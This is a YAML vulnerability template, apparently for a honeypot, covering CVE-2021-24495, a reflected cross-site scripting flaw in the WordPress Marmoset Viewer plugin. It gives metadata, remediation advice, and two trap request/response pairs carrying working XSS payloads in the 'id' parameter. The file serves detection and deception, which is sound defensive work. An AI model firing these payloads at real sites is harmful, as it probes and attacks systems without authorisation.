id: CVE-2021-24495
info:
  name: Wordpress Marmoset Viewer <1.9.3 - Cross-Site Scripting
  author: johnjhacking
  description: WordPress Marmoset Viewer plugin before 1.9.3 contains a cross-site
    scripting vulnerability. It does not property sanitize, validate, or escape the
    'id' parameter before outputting back in the page.
  severity: medium
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into web pages viewed by users, leading to potential
    data theft, session hijacking, or defacement of the affected website.

    '
  remediation: 'Update the Wordpress Marmoset Viewer plugin to version 1.9.3 or later
    to mitigate the vulnerability.

    '
  reference:
  - https://johnjhacking.com/blog/cve-2021-24495-improper-neutralization-of-input-during-web-page-generation-on-id-parameter-in-wordpress-marmoset-viewer-plugin-versions-1.9.3-leads-to-reflected-cross-site-scripting/
  - https://wordpress.org/plugins/marmoset-viewer/#developers
  - https://wpscan.com/vulnerability/d11b79a3-f762-49ab-b7c8-3174624d7638
  - https://nvd.nist.gov/vuln/detail/CVE-2021-24495
  - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-24495
    cwe-id: CWE-79
    epss-score: 0.00116
    epss-percentile: 0.44405
    cpe: cpe:2.3:a:marmoset:marmoset_viewer:*:*:*:*:*:wordpress:*:*
  metadata:
    max-request: 2
    vendor: marmoset
    product: marmoset_viewer
    framework: wordpress
  tags: cve2021,cve,xss,wpscan,wp-plugin,wordpress,intrusive,marmoset
traps:
- request:
    method: GET
    path: /wp-content/plugins/marmoset-viewer/mviewer.php?id=http://</script><svg/onload=alert(%27%27)>
    headers: null
    body: null
  response:
    status_code: 200
    headers:
      VulTrap: text/html
    body: </script><svg/onload=alert('964b90087441434ea9d13df05f5cb9d7')>alert(/964b90087441434ea9d13df05f5cb9d7/)Marmoset
      Viewer
- request:
    method: GET
    path: /wp-content/plugins/marmoset-viewer/mviewer.php?id=1+http://a.com%27);alert(//);marmoset.embed(%27a
    headers: null
    body: null
  response:
    status_code: 200
    headers: {}
    body: ''
